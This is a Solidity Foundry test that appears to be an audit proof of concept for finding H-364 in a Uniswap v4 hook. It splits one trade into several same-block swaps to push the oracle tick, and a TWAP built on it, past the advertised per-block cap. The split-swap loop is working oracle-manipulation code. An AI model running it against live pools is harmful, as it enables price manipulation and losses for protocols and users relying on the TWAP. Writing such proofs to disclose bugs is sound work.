// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {console2} from "forge-std/console2.sol";

import {PoolId} from "@uniswap/v4-core/src/types/PoolId.sol";

import {HookTestBase} from "test/helpers/HookTestBase.sol";

/// @title PoC_H364_OracleClampPerSwapNotPerBlock
/// @notice Harm assertion for H-364: the truncated-oracle move cap in
/// `FactoryHook._updateVolatility` (`src/hook/FactoryHook.sol:519-529`) is applied once per
/// INVOCATION, and `_updateVolatility` is invoked unconditionally from `_beforeSwap` on every
/// swap (`:387`). Nothing compares `state.lastSwapTimestamp` to `block.timestamp` before
/// clamping, so the number of clamp steps taken inside a block is chosen by the caller. This
/// test drives the REAL hooked V4 pool with real swaps — no harness, no internal-function
/// exposure — and shows the recorded oracle tick moving several multiples of `MAX_ABS_TICK_MOVE`
/// inside a single block, and that poisoned tick then feeding `tickCumulative` for downstream
/// TWAP consumers (`observe`, `:291-296`).
contract PoC_H364_OracleClampPerSwapNotPerBlock is HookTestBase {
    PoolId internal poolId;
    address internal manipulator;

    uint256 internal constant SPLITS = 5;
    uint256 internal constant SPLIT_SIZE = 40 ether;
    uint256 internal constant TWAP_WINDOW = 600;

    function setUp() public virtual override {
        super.setUp();
        _graduate(coin);

        poolId = _poolId(address(coin));
        manipulator = makeAddr("Manipulator");
        vm.deal(manipulator, 10_000 ether);

        // Anchor the oracle: one swap in a settled block establishes `truncatedTick` and
        // `lastSwapTimestamp` so the attack block starts from a known recorded tick.
        _swapEthForCoin(address(coin), manipulator, 1 ether);
        vm.warp(block.timestamp + 12);
        vm.roll(block.number + 1);
    }

    /// @notice HARM: the recorded oracle tick moves by MULTIPLES of `MAX_ABS_TICK_MOVE` inside a
    /// single block, purely because the caller chose to split one trade into several swaps. The
    /// advertised per-block damping bound does not exist.
    function test_H364_SplitSwapsInOneBlockBreachThePerBlockCap() public {
        uint256 attackBlockTimestamp = block.timestamp;
        uint256 attackBlockNumber = block.number;

        (, int24 recordedAtBlockStart) = hook.observe(poolId);
        int24 cap = hook.MAX_ABS_TICK_MOVE();

        for (uint256 i; i < SPLITS; ++i) {
            // No warp / no roll between iterations: every one of these swaps lands in ONE block,
            // exactly as a bundle of swaps in a single transaction batch would.
            _swapEthForCoin(address(coin), manipulator, SPLIT_SIZE);
        }

        assertEq(block.timestamp, attackBlockTimestamp, "all swaps occurred in one block (timestamp)");
        assertEq(block.number, attackBlockNumber, "all swaps occurred in one block (number)");

        (, int24 recordedAfter) = hook.observe(poolId);
        int256 moved = _abs(int256(recordedAfter) - int256(recordedAtBlockStart));

        console2.log("recorded tick at block start:", recordedAtBlockStart);
        console2.log("recorded tick after split swaps:", recordedAfter);
        console2.log("absolute single-block movement:", moved);
        console2.log("MAX_ABS_TICK_MOVE:", cap);

        // HARM 1: a single block moved the recorded oracle tick past the cap that is supposed to
        // bound exactly this.
        assertGt(moved, int256(cap), "HARM: single-block oracle move exceeds MAX_ABS_TICK_MOVE");

        // HARM 2: and not marginally — the breach scales with the attacker-chosen split count.
        // Each swap after the first contributes its own clamp step (the clamp reads the PRE-swap
        // tick), so N swaps buy up to N-1 steps.
        assertGt(moved, int256(cap) * 2, "HARM: movement is a multiple of the cap, chosen by the caller");
    }

    /// @notice HARM (downstream): the poisoned recorded tick is what accrues into
    /// `tickCumulative` after the attack block, so any consumer deriving a TWAP as
    /// (cum2-cum1)/(t2-t1) reads an average tick far outside the damped bound.
    function test_H364_PoisonedTickFeedsTheDownstreamTwap() public {
        (, int24 recordedAtBlockStart) = hook.observe(poolId);
        int24 cap = hook.MAX_ABS_TICK_MOVE();

        for (uint256 i; i < SPLITS; ++i) {
            _swapEthForCoin(address(coin), manipulator, SPLIT_SIZE);
        }

        (int56 cum1,) = hook.observe(poolId);
        vm.warp(block.timestamp + TWAP_WINDOW);
        (int56 cum2,) = hook.observe(poolId);

        int256 twap = (int256(cum2) - int256(cum1)) / int256(TWAP_WINDOW);
        console2.log("TWAP tick observed over the window after the attack block:", twap);

        // The TWAP a consumer reads over the window is the poisoned tick itself...
        int256 drift = _abs(twap - int256(recordedAtBlockStart));

        // HARM: ...and it sits more than one damping step away from where the oracle was at the
        // start of the manipulation block — the property `MAX_ABS_TICK_MOVE` advertises.
        assertGt(drift, int256(cap), "HARM: downstream TWAP inherits an out-of-bound single-block move");
    }

    function _abs(int256 x) internal pure returns (int256) {
        return x < 0 ? -x : x;
    }
}
